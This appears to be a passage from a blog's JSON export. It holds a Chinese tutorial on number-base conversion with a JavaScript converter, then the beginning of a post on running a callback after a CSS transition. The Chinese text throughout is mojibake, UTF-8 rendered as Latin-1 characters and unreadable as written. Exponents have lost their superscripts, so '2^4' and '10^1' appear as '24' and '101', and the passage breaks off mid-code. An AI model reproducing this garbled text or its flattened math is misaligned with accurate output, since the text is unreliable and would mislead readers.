ã€Œä½ è¦ç”¨å“ªå€‹è¦å‰‡ä¾†è¡¨ç¤ºä¸€å€‹æ•¸ã€ çš„æ„æ€ã€‚ è€Œä¸”ä½ æ—©å°±å­¸æœƒæ€éº¼åšé€²ä½é€™ä»¶äº‹äº†ï¼ˆå¾…æœƒå°±çŸ¥é“äº†ï¼‰ ä¸çŸ¥é“å„ä½æœ‰æ²’æœ‰ä¸Šéè¨ˆç®—æ©Ÿæ¦‚è«–æˆ–è€…è‡ªå·± Google éï¼Œå¤§éƒ¨åˆ†æ‡‰è©²æœƒå¾—åˆ°é€™æ¨£çš„è§£é‡‹ï¼š ã€Œé€¢ 10 é€²ä½ã€ï¼ˆå¦‚æœæ˜¯åé€²ä½çš„è©±ï¼‰ ä»¥å‰çš„æˆ‘è½åˆ°é€™å€‹è§£é‡‹å¾Œï¼Œæˆ‘å¿ƒè£¡çš„æ„Ÿæƒ³æ˜¯ï¼Œç—¾â€¦åˆ°åº•ä»€éº¼å«åšé€¢ 10 é€²ä½ï¼Ÿ ä¸éåœ¨æˆ‘ç†è§£å¾Œï¼Œæˆ‘èªç‚ºé€™å¥è©±çš„å®Œæ•´æ„æ€æ‡‰è©²è¦é€™æ¨£èªªï¼šã€Œæ¯ç•¶ç¢°åˆ° 10 é€™å€‹æ•¸å­—ï¼Œå°±å¢åŠ ä¸€å€‹ä½æ•¸ã€ è®“æˆ‘å€‘ç›´æ¥ä¾†çœ‹å€‹ä¾‹å­å§ã€‚ å¦‚æœè¦ä½ ç®— 18 + 25ï¼Œä½ æœƒæ€éº¼è¨ˆç®—å‘¢ï¼Ÿï¼ˆæˆ‘çŸ¥é“ä½ æœƒé¦¬ä¸Šèªªæ˜¯ 43ï¼Œä½†é‡é»æ˜¯ä½ æ€éº¼ç®—çš„ï¼Ÿï¼‰ æˆ‘ç›¸ä¿¡ä¸ç®¡ä½ æ˜¯æ•¸å­¸èœé€¼é‚„æ˜¯æ•¸å­¸å¤©æ‰ï¼Œæ‡‰è©²éƒ½æ˜¯ç”¨é€™ç¨®æ–¹å¼ä¾†è¨ˆç®—çš„ã€‚ å…ˆè¨ˆç®—8 + 5çš„éƒ¨åˆ†ï¼Œæœƒå¾—åˆ°13 æ¥è‘—å› ç‚º13è¶…é 10 äº†ï¼Œæ‰€ä»¥æŠŠ1åŠ åˆ°ä¸‹ä¸€å€‹ä½æ•¸ï¼Œç•™ä¸‹3 æ¥è‘—è¨ˆç®—1 + 2çš„éƒ¨åˆ†ï¼Œæœƒå¾—åˆ°3 æ¥è‘—å› ç‚ºå‰é¢çš„1è¦åŠ åˆ°é€™å€‹ä½æ•¸ï¼Œæ‰€ä»¥æœ€å¾Œ3è¦å†åŠ ä¸Šé€™å€‹è¢«é€²ä½çš„1ï¼Œå¾—åˆ°4 æœ€å¾Œæ‰èƒ½å¾—åˆ°ç­”æ¡ˆ43 ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰æ³¨æ„åˆ°ï¼Ÿ åœ¨ç¬¬äºŒå€‹æ­¥é©Ÿçš„æ™‚å€™ï¼Œä½ å¾ˆè‡ªç„¶çš„åšäº†é€²ä½é€™ä»¶äº‹ï¼Œä½ çŸ¥é“ 13 æ˜¯ä¸€å€‹è¶…å‡º 10 çš„æ•¸å­—ï¼Œæ‰€ä»¥å°±æŠŠ 1 æ”¾åˆ°åä½æ•¸å»ï¼Œè®“å€‹ä½æ•¸åªå‰©ä¸‹ 3ã€‚ æ²’éŒ¯ï¼Œé€¢ 10 é€²ä½å°±æ˜¯æŒ‡é€™å€‹å¾ˆç°¡å–®çš„å‹•ä½œè€Œå·²ã€‚ å¦‚æœä½ é‚„æ˜¯ä¼¼æ‡‚éæ‡‚çš„è©±ï¼Œä½ å¯ä»¥å†æ€è€ƒçœ‹çœ‹ï¼Œå¦‚æœä½ ä¸åšé€²ä½é€™å€‹å‹•ä½œçš„è©±ï¼Œæœƒè®Šæ€éº¼æ¨£ï¼Ÿ å…ˆè¨ˆç®—8 + 5çš„éƒ¨åˆ†ï¼Œæœƒå¾—åˆ°13 æ¥è‘—è¨ˆç®—1 + 2çš„éƒ¨åˆ†ï¼Œæœƒå¾—åˆ°3 æœ€å¾Œå¾—åˆ°313 é€™æ™‚å€™ä½ æ‡‰è©²å°±èƒ½ç†è§£ï¼Œç‚ºä»€éº¼éœ€è¦é€²ä½é€™ä»¶äº‹äº†å§ï¼Ÿ å¦‚æœæ²’æœ‰é€²ä½çš„è©±ï¼Œé‚£æ•¸å­—æœƒè®Šå¾—éå¸¸çš„é•·ï¼Œä½ ä¹Ÿå¾ˆé›£ç†è§£é€™å€‹æ•¸å¯¦éš›è¦è¡¨é”çš„æ˜¯ä»€éº¼ã€‚ æ‰€ä»¥å†å¼·èª¿ä¸€æ¬¡ï¼Œæ•¸å­—ç³»çµ±çš„ç”¨é€”åªæ˜¯è®“ä½ æ›´å¥½åœ°å» ã€Œè¡¨ç¤ºä¸€å€‹æ•¸ã€ï¼Œåƒ…æ­¤è€Œå·²ã€‚ åˆ°é€™é‚Šä½ éƒ½èƒ½ç†è§£çš„è©±ï¼Œé‚£æ¥è‘—è¦ç†è§£å…¶ä»–é€²ä½åˆ¶å°±ä¸æ˜¯ä»€éº¼é›£äº‹äº†ï¼Œåªæ˜¯æ›ä¸€å€‹è¦å‰‡ä¾†è¡¨ç¤ºè€Œå·²ã€‚ ä¾†çœ‹ä¸€äº›ä¾‹å­å§ ç¾åœ¨æˆ‘å€‘æœ‰ä¸€å€‹ 10 é€²ä½çš„æ•¸å­—3ï¼Œç¾åœ¨æˆ‘å€‘è¦æ”¹æˆç”¨ 2 é€²ä½ä¾†è¡¨ç¤ºçš„è©±ï¼Œæ€éº¼è¡¨ç¤ºï¼Ÿ é¦–å…ˆï¼Œæ—¢ç„¶æ˜¯äºŒé€²ä½ï¼Œæ‰€ä»¥æˆ‘å€‘çš„è¦å‰‡å°±æœƒè®Šæˆæ˜¯ã€Œé€¢ 2 é€²ä½ã€ã€‚ 3æ˜¯ä¸€å€‹è¶…é 2 çš„æ•¸å­—ï¼Œæ‰€ä»¥æŠŠ1åŠ åˆ°ä¸‹ä¸€å€‹ä½æ•¸ï¼Œç•™ä¸‹1 1æ²’æœ‰è¶…é 2ï¼Œæ‰€ä»¥ä¸ç”¨å†é€²ä½ æœ€å¾Œå¾—åˆ°11 å†ä¾†ä¸€å€‹ï¼Œ4çš„è©±å‘¢ï¼Ÿ 4æ˜¯ä¸€å€‹è¶…é 2 çš„æ•¸å­—ï¼Œæ‰€ä»¥æŠŠ1åŠ åˆ°ä¸‹ä¸€å€‹ä½æ•¸ï¼Œç•™ä¸‹2 2é‚„æ˜¯ä¸€å€‹è¶…é 2 çš„æ•¸å­—ï¼Œæ‰€ä»¥å†æŠŠ1åŠ åˆ°ä¸‹ä¸€å€‹ä½æ•¸ï¼Œç•™ä¸‹0 2ï¼ˆå‰é¢é€²ä½çš„å…©å€‹ 1ï¼‰ï¼Œæ˜¯ä¸€å€‹è¶…é 2 çš„æ•¸å­—ï¼Œæ‰€ä»¥æŠŠ1åŠ åˆ°ä¸‹ä¸€å€‹ä½æ•¸ï¼Œç•™ä¸‹0 1æ²’æœ‰è¶…é 2ï¼Œæ‰€ä»¥ä¸ç”¨å†é€²ä½ æœ€å¾Œå¾—åˆ°100 ä»¥ä¸Šå¤§è‡´å°±æ˜¯æ•¸å­—ç³»çµ±çš„æ ¸å¿ƒæ¦‚å¿µäº†ï¼Œåªè¦ä½ èƒ½ç†è§£ï¼Œé‚£å°±ç®—ä½ æƒ³ç™¼æ˜ä¸€å€‹ 87 é€²ä½ä¹Ÿæ‡‰è©²ä¸æœƒæ˜¯å€‹å•é¡Œâ€¦. é€™é‚Šç‰¹åˆ¥è£œå……ä¸€ä¸‹ï¼Œæœ‰äº›äººå¯èƒ½æœƒæƒ³å•ï¼Ÿåå…­é€²ä½çš„è©±10 ~ 11è¦æ€éº¼è¡¨ç¤ºï¼Ÿ é€™å€‹ç–‘æƒ‘å¾ˆåˆç†ï¼Œç•¢ç«Ÿæˆ‘å€‘ç›´æ¥ç”¨ 11 ~ 15 ä¾†è¡¨ç¤ºä¸€å€‹ä½æ•¸çš„è©±é¡¯ç„¶æ˜¯æœ‰é»é›£ç†è§£ã€‚ æ‰€ä»¥ç‚ºäº†é¿å…é€™å€‹å•é¡Œï¼Œæœƒæ”¹ç”¨é€™æ¨£ä¾†è¡¨ç¤ºï¼š a ä»£è¡¨ 10 b ä»£è¡¨ 11 c ä»£è¡¨ 12 d ä»£è¡¨ 13 e ä»£è¡¨ 14 f ä»£è¡¨ 15 é€™è£¡æä¾›ä¸€å€‹é€²ä½è½‰æ›çš„ç¶²é ï¼Œå¦‚æœé‚„æ˜¯ä¸å¤ªæ¸…æ¥šçš„è©±ï¼Œå¯ä»¥åˆ°é€™è£¡å»ç©ç©çœ‹ï¼Œå»è§€å¯Ÿæ•¸å­—åœ¨é€²ä½æ™‚çš„è®ŠåŒ–ï¼Œå¤šè©¦å¹¾æ¬¡å°±èƒ½å¹«åŠ©ä½ å»ç†è§£é€™å€‹æ¦‚å¿µå›‰ï¼ æ€éº¼å°æ•¸å­—åšé€²ä½åˆ¶è½‰æ›åœ¨å­¸æ€éº¼è½‰æ›å‰ï¼Œå…ˆè§£é‡‹ä¸€ä¸‹ç‚ºä»€éº¼è¦å­¸é€™å€‹æ±è¥¿ã€‚ é›–ç„¶ç¾åœ¨éš¨ä¾¿ Google éƒ½æœ‰ç¾æˆçš„å·¥å…·å¯ä»¥å¹«ä½ åšé€²ä½è½‰æ›ï¼Œä½†æœ‰äº›æ™‚å€™é‡è¦çš„ä¸¦ä¸åªæ˜¯æ•¸å­—è½‰æ›å¾Œçš„çµæœï¼Œè€Œæ˜¯å®ƒåœ¨è½‰æ›éç¨‹ä¸­çš„ä¸€äº›æ¶µç¾©ã€‚ è©¦è‘—å»ç†è§£é€™äº›æ¶µç¾©ï¼Œæœƒå°ä½ åœ¨å¯«ç¨‹å¼æˆ–æ€è€ƒçš„æ™‚å€™æ˜¯æœ‰ä¸€äº›å¹«åŠ©å­˜åœ¨çš„ï¼ˆç›¸ä¿¡æˆ‘~ï¼‰ æŠŠåé€²ä½è½‰æ›æˆå…¶ä»–é€²ä½å‡è¨­ä¸€å€‹åé€²ä½çš„æ•¸å­—ç‚º25ï¼Œæ¥è‘—ä¾†è©¦è‘—æŠŠå®ƒè½‰æ›æˆäºŒé€²ä½ äºŒé€²ä½ 25 / 2 = 12 â€¦ 1 12 / 2 = 6 â€¦ 0 6 / 2 = 3 â€¦ 0 3 / 2 = 1 â€¦ 1 1 / 2 = 0 â€¦ 1 æ¥è‘—å†æŠŠé€™äº›æ•¸å­—ç”±ä¸‹è‡³ä¸Šçµ„åˆèµ·ä¾†ï¼Œ11001å°±æ˜¯ 25 çš„ 2 é€²ä½è¡¨ç¤ºæ³•ã€‚ ä½ æ‡‰è©²æ³¨æ„åˆ°äº†ï¼Œæˆ‘å€‘å…¶å¯¦å°±åªæ˜¯ä¸€ç›´åœ¨åšï¼Œé™¤ä»¥ 2 å¾Œå¾—åˆ°çš„é¤˜æ•¸è€Œå·²ï¼Œæ‰€ä»¥ä½ ä¹Ÿèƒ½æŠŠä»–ç¨±ä½œå–é¤˜æ•¸å¤§æ³•ï¼ˆï¼Ÿ æ‰€ä»¥åªè¦ä½ çŸ¥é“æ€éº¼å–é¤˜æ•¸ï¼Œé‚£ä½ å°±æœƒåšé€²ä½åˆ¶çš„è½‰æ›äº†ã€‚ ä¸éåœ¨é€™è£¡å…ˆè²æ˜ï¼Œé›–ç„¶ä½ å¯ä»¥ç”¨æ­»è¨˜çš„æ–¹å¼ä¾†åšè½‰æ›ï¼Œä½†æ¯”èµ·ç”¨æ­»è¨˜çš„ï¼Œæˆ‘æ›´æ¨è–¦ä½ å»ç†è§£èƒŒå¾Œçš„æ¶µç¾©ã€‚ åªè¦ä½ ä»”ç´°å»è§€å¯Ÿæ¯å€‹æ­¥é©Ÿï¼Œå°±æœƒç™¼ç¾å®ƒå…¶å¯¦ä¸¦ä¸è¤‡é›œï¼Œéƒ½æ˜¯å‰é¢æ‰€èªªçš„åŸºæœ¬æ¦‚å¿µè€Œå·²ã€‚ æ‰€ä»¥æˆ‘å€‘å…ˆçœ‹åˆ°ç¬¬ä¸€å€‹æ­¥é©Ÿã€‚ å° 25 é™¤ä»¥ 2ï¼Œå¾—åˆ°å•†ç‚º12ï¼Œé¤˜æ•¸ç‚º1 é€™è£¡ä½ å…ˆæ€è€ƒçœ‹çœ‹ï¼Œç‚ºä»€éº¼æˆ‘å€‘è¦å° 25 åšé™¤ä»¥ 2ï¼Œè·Ÿå–å®ƒçš„é¤˜æ•¸é€™ä»¶äº‹ï¼Ÿï¼ˆå›æƒ³çœ‹çœ‹æˆ‘å€‘ä»‹ç´¹æ•¸å­—ç³»çµ±æ™‚çš„æ¦‚å¿µï¼‰ å› ç‚º 25 æ˜¯ä¸€å€‹è¶…é 2 çš„æ•¸å˜›ï¼æ‰€ä»¥è¦åšä»€éº¼ï¼Ÿé€²ä½é˜¿ï¼é˜¿è¦é€²ä½å¹¾æ¬¡ï¼Ÿé€²ä½æ•¸å­—åˆ°ä¸è¶…é 2ç‚ºæ­¢å˜›ï¼ é‚£æˆ‘è¦æ€éº¼çŸ¥é“è©²é€²ä½å¹¾æ¬¡ï¼Œè·Ÿä»€éº¼æ™‚æ™‚å€™æ•¸å­—æ‰æœƒä¸è¶…é 2 é€™ä»¶äº‹ï¼Ÿ é€éç¬¬ä¸€æ­¥æ‰€åšçš„äº‹æƒ…å°±èƒ½çŸ¥é“å›‰ï¼ æŠŠæŸå€‹æ•¸å­—å° 2 åšé™¤æ³•ï¼Œæ±‚å‡ºå®ƒçš„å•†è·Ÿé¤˜æ•¸ï¼Œå•†æ•¸ä»£è¡¨é€™å€‹æ•¸å­—é€²ä½äº†å¹¾æ¬¡ï¼Œé¤˜æ•¸å°±ä»£è¡¨å‰©ä¸‹äº†å¤šå°‘æ•¸ã€‚ ä¸€ç›´é‡è¤‡é€™å€‹æ­¥é©Ÿï¼Œç›´åˆ°å•†æ•¸ç‚º 0ï¼Œå°±ä»£è¡¨ä¸èƒ½å†é€²ä½äº†ï¼Œè€Œæ­¤æ™‚çš„é¤˜æ•¸å°±ä»£è¡¨é€²ä½åˆ°æœ€å¾Œå‰©ä¸‹çš„æ•¸ã€‚ æ‰€ä»¥æˆ‘å€‘åœ¨é‡æ–°çœ‹ä¸€ä¸‹å‰é¢çš„è¨ˆç®—ï¼Œå¯ä»¥åˆ—æˆä»¥ä¸‹é€™äº›æ­¥é©Ÿï¼š 25 / 2 = 12 â€¦ 1ï¼Œä»£è¡¨ 25 å¯ä»¥è¢« 2 é€²ä½12æ¬¡ï¼Œå‰©ä¸‹1ï¼Œé€²ä½å¾Œçš„ 12 é‚„å¯ä»¥è¢« 2 é€²ä½å¹¾æ¬¡ï¼Ÿ 12 / 2 = 6 â€¦ 0ï¼Œä»£è¡¨ 12 å¯ä»¥è¢« 2 é€²ä½6æ¬¡ï¼Œå‰©ä¸‹0ï¼Œé€²ä½å¾Œçš„ 6 é‚„å¯ä»¥è¢« 2 é€²ä½å¹¾æ¬¡ï¼Ÿ 6 / 2 = 3 â€¦ 0ï¼Œä»£è¡¨ 6 å¯ä»¥è¢« 2 é€²ä½3æ¬¡ï¼Œå‰©ä¸‹0ï¼Œé€²ä½å¾Œçš„ 3 é‚„å¯ä»¥è¢« 2 é€²ä½å¹¾æ¬¡ï¼Ÿ 3 / 2 = 1 â€¦ 1ï¼Œä»£è¡¨ 3 å¯ä»¥è¢« 2 é€²ä½1æ¬¡ï¼Œå‰©ä¸‹1ï¼Œé€²ä½å¾Œçš„ 1 é‚„å¯ä»¥è¢« 2 é€²ä½å¹¾æ¬¡ï¼Ÿ 1 / 2 = 0 â€¦ 1ï¼Œ ä»£è¡¨ 1 ä¸èƒ½å†è¢« 2 é€²ä½äº†ï¼Œæœ€å¾Œå‰©ä¸‹çš„æ•¸ç‚º1ã€‚ ä¸ç®¡æ˜¯äºŒé€²ä½ã€å…«é€²ä½ã€åå…­é€²ä½ï¼Œç”šè‡³æ˜¯åé€²ä½æœ¬èº«ï¼Œéƒ½å¯ä»¥éµå¾ªé€™å€‹è¦å‰‡å»åšã€‚ æ¥è‘—è©¦è‘—è‡ªå·±ç·´ç¿’çœ‹çœ‹å§ï¼æŠŠ 25 è½‰æ›æˆå…¶ä»–é€²ä½çœ‹çœ‹ï¼Œå¦‚æœéƒ½æ­£ç¢ºçš„è©±ï¼Œå°±ä»£è¡¨ä½ æœ‰ç†è§£é€™å€‹æ¦‚å¿µå›‰ï¼ æŠŠå…¶ä»–é€²ä½è½‰æ›æˆåé€²ä½å»¶çºŒå‰é¢çš„ä¾‹å­ï¼Œç¾åœ¨æˆ‘å€‘çŸ¥é“11001æ˜¯ä»£è¡¨ 25ï¼Œä½†é€™ä¹‹é–“æ˜¯ç™¼ç”Ÿäº†ä»€éº¼ï¼Ÿæ€éº¼åšåˆ°çš„ï¼Ÿ å…¶å¯¦ä½ åªè¦æŠŠå¥¹æ‹†æˆæ¬¡æ–¹ä¾†çœ‹å°±å¯ä»¥äº†ï¼Œåƒé€™æ¨£ï¼š 1 x 24 + 1 x 23 + 0 x 22 + 0 x 21 + 1 x 20 æŠŠä¸Šé¢é€™äº›ç®—å¼ç®—å‡ºä¾†å¾Œï¼Œå°±æœƒå¾—åˆ°25 å‚‘å…‹ï¼Œé€™çœŸæ˜¯å¤ªç¥å¥‡äº†ï¼ï¼ ç‚ºä»€éº¼èƒ½é€™æ¨£å‘¢ï¼Ÿ æˆ‘å€‹äººèªç‚ºæ¯”è¼ƒå¥½ç†è§£çš„æ–¹å¼æ˜¯ï¼Œç”¨ä½æ•¸çš„æ¦‚å¿µä¾†è§€å¯Ÿã€‚ è­¬å¦‚èªªï¼Œå¦‚æœæ˜¯è¦ä½ æŠŠ 10 é€²ä½ç”¨æ¬¡æ–¹ä¾†è¡¨ç¤ºçš„è©±ï¼Œä½ æ‡‰è©²èƒ½å¾ˆç›´è¦ºçš„å¾—å‡ºä»¥ä¸‹å¼å­ï¼š 25 = 2 x 101 + 5 x 100ï¼Œå¾—åˆ°25 ç‚ºä»€éº¼é€™éº¼ç›´è¦ºï¼Ÿ é¦–å…ˆä½ çŸ¥é“ï¼Œ10 é€²ä½ä»£è¡¨æ¯å€‹ä½æ•¸çš„æ•¸å­—åªèƒ½åœ¨ 0 ~ 9 æ¥è‘—ä½ åˆçŸ¥é“ç¬¬ä¸€å€‹ä½æ•¸çš„ç¯„åœå¿…é ˆæ˜¯åœ¨ 0 ~ 9 ä¹‹é–“çš„æ•¸ï¼Œé‚£ä¸€å®šå¾—æ˜¯1 x né€™æ¨£çš„ç®—å¼æ‰æœ‰è¾¦æ³•æ±‚å‡ºï¼Œæ‰€ä»¥å¦‚æœè¦å¯«æˆæ¬¡æ–¹çš„è©±ï¼Œæˆ‘å€‘åªèƒ½å¯«æˆ 100ï¼Œæ¥è‘—åœ¨æŠŠ 100å»ä¹˜ä¸Šä¸€å€‹æ•¸ï¼Œå°±èƒ½å¾—å‡º 0~9 ä¹‹é–“çš„æ•¸å­—ã€‚ æ¥è‘—æ˜¯ç¬¬äºŒå€‹ä½æ•¸ï¼Œä»£è¡¨æ•¸å­—çš„ç¯„åœå¿…é ˆåœ¨ 10 ~ 99 ä¹‹é–“ï¼Œé‚£å°±ä¸€å®šå¾—æ˜¯10 x né€™æ¨£çš„ç®—å¼æ‰æœ‰è¾¦æ³•æ±‚å‡ºï¼Œæ‰€ä»¥å¯«æˆæ¬¡æ–¹çš„è©±å°±æœƒæ˜¯ 101ï¼Œæ¥è‘—å†æŠŠ 101å»ä¹˜ä¸Šä¸€å€‹æ•¸ï¼Œå°±èƒ½å¾—å‡º 10~99 ä¹‹é–“çš„æ•¸å­—ã€‚ æœ€å¾ŒæŠŠå…©å€‹æ•¸å­—ç›¸åŠ ï¼Œå°±èƒ½å¾—å‡ºæœ€å¾Œçš„çµæœï¼Œä¹Ÿå°±æ˜¯25 å…¶å¯¦æ›æˆ 2 é€²ä½ä¹Ÿæ˜¯ä¸€æ¨£çš„é“ç†ï¼š é¦–å…ˆä½ çŸ¥é“ï¼Œ2 é€²ä½ä»£è¡¨æ¯å€‹ä½æ•¸çš„æ•¸å­—åªèƒ½åœ¨ 0 ~ 1 ç¾åœ¨ç¬¬ä¸€å€‹ä½æ•¸çš„ç¯„åœæ˜¯åœ¨ 0 ~ 1ï¼Œé‚£å¾—æ˜¯1 x nï¼Œæ‰€ä»¥å°±æœƒæ˜¯ 20 ç¬¬äºŒå€‹ä½æ•¸çš„ç¯„åœæ˜¯åœ¨ 2 ~ 4ï¼Œé‚£å¾—æ˜¯ 2 x nï¼Œæ‰€ä»¥å°±æœƒæ˜¯ 21 ç¬¬ä¸‰å€‹ä½æ•¸çš„ç¯„åœæ˜¯åœ¨ 4 ~ 8ï¼Œé‚£å¾—æ˜¯4 x nï¼Œæ‰€ä»¥å°±æœƒæ˜¯ 22 ä»¥æ­¤é¡æ¨ ç™¼ç¾åˆ°è¦å¾‹äº†å—ï¼Ÿæ¯ç•¶æˆ‘å€‘é€²ä¸€å€‹ä½æ•¸ï¼Œå°±ä»£è¡¨ç¯„åœæœƒå¢åŠ ä¸€å€ï¼Œæ‰€ä»¥æ¬¡æ–¹çš„æ•¸å­—å°±å¾—è·Ÿè‘—åŠ  1ã€‚ æ‰€ä»¥å†å›éé ­ä¾†çœ‹11001 ç…§è‘—å‰é¢çš„é‚è¼¯ï¼Œä½ è…¦ä¸­æ‡‰è©²è¦æœ‰é€™å€‹ç•«é¢ï¼š 1 1 0 0 1 1 x 24 1 x 23 0 x 22 0 x 21 1 x 20 æ¥ä¸‹ä¾†è©²æ€éº¼è®Šæˆ 10 é€²ä½æ‡‰è©²å°±ä¸ç”¨æˆ‘å¤šè§£é‡‹äº†å§ï¼Ÿ å¯¦åšä¸€å€‹è½‰æ›é€²ä½çš„ç¨‹å¼é€™è£¡å°±ç•™çµ¦å„ä½å»æŒ‘æˆ°çœ‹çœ‹ï¼Œå¦‚æœæ„Ÿåˆ°è‹¦æƒ±çš„è©±å°±å…ˆæ€è€ƒçœ‹çœ‹è‡ªå·±æ˜¯ä¸æ˜¯æœ‰ä»€éº¼åœ°æ–¹æ²’æœ‰å¼„æ¸…æ¥šï¼Ÿ å¦å¤–é—œæ–¼ 16 é€²ä½ï¼Œå› ç‚ºè¦è€ƒæ…®åˆ° 10 ~ 15 çš„å•é¡Œï¼Œæ‰€ä»¥é€™éƒ¨åˆ†å¦‚æœè¦ºå¾—æ¯”è¼ƒè¤‡é›œçš„äººï¼Œå¯ä»¥å…ˆçœç•¥ 16 é€²ä½ï¼Œå…ˆå¾äºŒã€å…«é€²ä½è©¦è©¦çœ‹ï¼ é™„ä¸Šè‡ªå·±çš„ç¨‹å¼ç¢¼ï¼š 12345678910111213141516171819202122232425262728293031323334353637function covert(n, base) { // å„²å­˜è½‰æ›å¾Œçš„çµæœ(ç”¨ä¸‰å…ƒé‹ç®—å­è¨­å®šåˆå§‹å€¼) let result = base !== 16 ? 0 : '' // ä»£è¡¨ä½æ•¸ let digit = 0 while (n !== 0) { // é¤˜æ•¸ let remainder = n % base // 16é€²ä½çš„é¤˜æ•¸è™•ç† if (remainder === 10) remainder = 'A' if (remainder === 11) remainder = 'B' if (remainder === 12) remainder = 'C' if (remainder === 13) remainder = 'D' if (remainder === 14) remainder = 'E' if (remainder === 15) remainder = 'F' // é16é€²ä½çš„è¡¨ç¤ºæ³• if (base !== 16) { // å–å‡ºé¤˜æ•¸ä¸¦ä¹˜ä¸Šå°æ‡‰ä½æ•¸ result += remainder * 10 ** digit // æ›´æ–°ç‚ºä¸‹å€‹ä½æ•¸ digit++ // å–å‡ºé€²ä½æ•¸ n = Math.floor(n / base) } else { result = remainder + result // å–å‡ºé€²ä½æ•¸ n = Math.floor(n / base) } } return result}console.log(covert(8, 2)) // 1000console.log(covert(26, 16)) // 1A æ–‡æœ«è¬è¬çœ‹å®Œé€™ç¯‡æ–‡ç« çš„å„ä½ï¼Œè‡ªå·±é–‹å§‹å¯«æ–‡ç« å¾Œæ‰æ˜ç™½ï¼Œå¯«æ–‡ç« ä¸æ˜¯ä»¶æƒ³åƒä¸­å®¹æ˜“çš„äº‹ï¼Œä¸çŸ¥ä¸è¦ºä¸­ä¸€å€‹ä¸‹åˆå°±æ¶ˆå¤±äº†ã€‚ä¸éåœ¨å®Œæˆé€™ç¯‡æ–‡ç« å¾Œï¼Œæˆ‘ä¹Ÿæ„Ÿå—åˆ°å…¶å¯¦å¯«æ–‡ç« å°æ–¼å­¸ç¿’ç¢ºå¯¦æ˜¯æœ‰å¹«åŠ©çš„ï¼Œåœ¨æ’°å¯«çš„éç¨‹ä¸­ä¹Ÿèƒ½ç™¼ç¾ä¸€äº›è‡ªå·±çš„å•é¡Œã€‚ åƒæ˜¯å¾ˆå¤šæ™‚å€™æˆ‘å€‘ä»¥ç‚ºè‡ªå·±äº†è§£æŸå€‹æ±è¥¿ï¼Œä½†å¯¦éš›ä¸Šä¸¦ä¸æ˜¯é€™å€‹æ¨£å­ï¼Œäº‹å¯¦ä¸Šæˆ‘å€‘ä¸¦æ²’æœ‰çœŸæ­£çš„ç†è§£ï¼Œåªæ˜¯èª¤ä»¥ç‚ºè‡ªå·±å¥½åƒç†è§£é€™ä»¶äº‹ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰æ›´éœ€è¦å»æ­£è¦–è‡ªå·±çš„å•é¡Œï¼Œæ‰¾å‡ºæ”¹å–„æ–¹æ³•ï¼Œæˆ–è€…å¼„æ¸…æ¥šæ˜¯å¡ä½çš„å“ªå€‹é»ï¼Ÿé€™æ¨£å­å¯èƒ½æ‰èƒ½çœŸæ­£çš„å»å­¸å¥½ä¸€å€‹çŸ¥è­˜å§ï¼Ÿæˆ‘æ˜¯é€™æ¨£å­èªç‚ºçš„ã€‚ æœ€å¾Œé‚„æ˜¯å†æ¬¡æ„Ÿè¬å„ä½ï¼Œå¦‚æœé€™ç¯‡æ–‡ç« å¹«ä½ è§£é–‹äº†ä½ å¤šå¹´çš„å›°æ“¾çš„è©±ï¼Œé‚£å°±å†å¥½ä¸éäº†ï¼ç•¶ç„¶ï¼Œå¦‚æœæ–‡ä¸­æœ‰ä»»ä½•éŒ¯èª¤ï¼Œæˆ–æ˜¯ä½ èªç‚ºæœ‰æ›´å¥½çš„å»ºè­°çš„è©±ï¼Œæ­¡è¿å‘æˆ‘è¯çµ¡ã€‚ åƒè€ƒè³‡æ–™äºŒã€å…«ã€åèˆ‡åå…­é€²ä½ (æ•¸å­—ç³»çµ±) è½‰æ›æ•™å­¸å…è²»ç·šä¸Šå–®ä½æ›ç®—æ•¸å­—ç³»çµ± - NUTNCSIE10412","link":"/2021/07/06/digital-system-conversion/"},{"title":"DOM ä¹‹åœ¨å‹•ç•«çµæŸå¾ŒåšæŸä»¶äº‹","text":"é€™ä¸‹æœ‰è¶£å›‰ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªè¦å¯¦ä½œå‡ºè·Ÿ jQuery animate çš„ callback ä¸€æ¨£çš„æ•ˆæœã€‚ æ‰€ä»¥ä¸Šç¶²æŸ¥äº†ä¸€ä¸‹ï¼Œç™¼ç¾é‚è¼¯ä¸è¤‡é›œï¼Œåªéœ€è¦é€é setTimeout ä¾†è®“ callback ç­‰åˆ°å‹•ç•«çµæŸæ™‚æ‰åŸ·è¡Œã€‚ åœ¨å‹•ç•«çµæŸå¾Œåˆªé™¤å…ƒç´ èˆ‰ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œè¦åšå‡ºé€™æ¨£çš„æ•ˆæœï¼š 1234&lt;div class=\"wrapper\"&gt; &lt;div class=\"block\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;button&gt;Animation trigger&lt;/button&gt; 1234567891011121314151617// å‹•ç•«ç§’æ•¸let duration = 1// é»æŒ‰éˆ• -&gt; åŸ·è¡Œå‹•ç•«document.querySelector('button') .addEventListener('click', handlerAnimation)function handlerAnimation () { // å–å¾—å…ƒç´  const element = document.querySelector('.block') // åˆ©ç”¨ transition åšå‡ºæ¼¸è®Šæ•ˆæœ element.style.transform = 'translateX(400px)' element.style.transition = `transform ${duration}s` // ç­‰å‹•ç•«çµæŸå¾Œæ‰æŠŠ .block ç§»é™¤ setTimeout(() =&gt; { element.remove() }, duration * 1000)} å°±é€™éº¼ç°¡å–®ï¼Œä¸ç”¨æ‡·ç–‘ï¼ æä¸€å€‹é™½æ˜¥ç‰ˆçš„ animateå…¶å¯¦å°±æ˜¯ç”¨ function åŒ…è£èµ·ä¾†ï¼Œç„¶å¾Œæ·»åŠ ä¸€äº›å¯èª¿æ•´çš„åƒæ•¸ï¼š 1234567891011121314151617181920212223242526272829303132/* @param selector: è¦åŸ·è¡Œå‹•ç•«çš„å…ƒç´  @param cssRule: è¦èª¿æ•´çš„ css è¦å‰‡ @param duration: å‹•ç•«ç§’æ•¸ @param callback: å‹•ç•«çµæŸå¾Œè¦åšçš„äº‹*/function animate(selector, cssRule, duration, callback) { const element = document.querySelector(selector) for (let key in cssRule) { // æ›´æ–° css è¦å‰‡ element.style[key] = cssRule[key] // æ¼¸è®Šæ•ˆæœ element.style['transition'] = `${key} ${duration}s` } // å‹•ç•«åŸ·è¡Œå®Œå¾Œè¦åšçš„äº‹ setTimeout(() =&gt; { // è¨˜å¾—æŠŠæŒ‡å®šå…ƒç´ ç”¨ callback å¸¶å›å» callback(element) }, duration * 1000)}// æŒ‰ä¸‹æŒ‰éˆ• -&gt; 